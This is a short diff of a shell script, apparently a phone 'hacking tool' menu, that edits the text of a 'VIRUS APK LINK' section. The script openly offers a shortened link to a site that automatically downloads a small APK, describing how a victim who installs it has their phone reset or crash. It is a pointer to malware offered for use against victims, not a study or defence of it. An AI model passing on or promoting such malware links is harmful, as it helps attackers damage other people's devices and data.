@@ -61,10 +61,10 @@ echo -e $r"                ☠☠☠☠☠☠☠☛ VIRUS APK LINK ☚☠☠☠�
 echo
 echo
 echo -e $wh"
-  You can get a below this which can make path to a
+  You can get a link below this which can make path to a
   website that automatically download a small apk file.
   And after the victim installed that apk in his phone,
-  the virus will store there and phone will be reset 
+  the virus will store there and phone will be reset or crash
   "
   echo
  echo -e $y"       https://bit.ly/3ild93L "
